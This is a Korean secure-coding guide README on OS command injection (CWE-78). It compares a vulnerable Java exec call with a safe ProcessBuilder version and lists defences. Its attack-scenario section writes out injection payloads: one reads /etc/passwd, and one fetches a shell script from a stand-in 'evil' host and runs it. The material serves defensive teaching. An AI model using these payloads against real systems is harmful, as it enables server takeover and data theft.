# 운영체제 명령어 삽입 (OS Command Injection) · CWE-78 · KISA 4.5

## 개념
OS 명령어 삽입은 외부 입력이 시스템 명령 실행 문자열에 검증 없이 포함될 때, 공격자가 셸 메타문자로 임의 명령을 덧붙여 실행하는 약점이다. 서버 장악으로 직결될 수 있는 고위험 약점이다.

## 취약 원인
- 입력을 셸 명령 문자열에 문자열 연결(`+`)로 삽입했다.
- `Runtime.getRuntime().exec("cmd " + input)` 처럼 셸을 통해 실행했다.
- `; | && $() ` 같은 메타문자를 걸러내지 않았다.

## 공격 시나리오
- 핑 진단 기능의 host 값에 `127.0.0.1 && cat /etc/passwd` 를 넣어 파일을 읽는다.
- `; wget http://evil/sh -O /tmp/x; sh /tmp/x` 로 원격 셸을 설치한다.
- 백틱/`$()` 명령 치환으로 결과를 외부로 전송한다.

## 안전한 코딩(핵심 조치)
- 셸을 거치지 않는 `ProcessBuilder` 로 명령과 인자를 배열로 분리 전달한다.
- 입력값을 허용 패턴(allowlist)으로 엄격히 검증한다.
- 가능하면 OS 명령 대신 언어/라이브러리 API로 기능을 대체한다.
- 실행 계정 권한을 최소화한다.

## 취약 vs 안전 차이
| 구분 | 취약 (Vulnerable.java) | 안전 (Secure.java) |
|------|------------------------|---------------------|
| 실행 방식 | `exec("ping " + host)` (셸) | `ProcessBuilder("ping", ..., host)` |
| 인자 처리 | 하나의 문자열 | 인자 배열로 분리 |
| 검증 | 없음 | allowlist 정규식 |

## CWE·KISA 매핑
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- KISA 소프트웨어 개발보안 가이드(2021) 4장 입력검증 및 표현 — 운영체제 명령어 삽입

## 실행/컴파일 방법
```
javac Vulnerable.java
javac Secure.java

python bugfinder/bugfinder.py examples/1_input-validation/1.05_CWE-78_os-command-injection
```

## 참고
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP OS Command Injection Defense Cheat Sheet
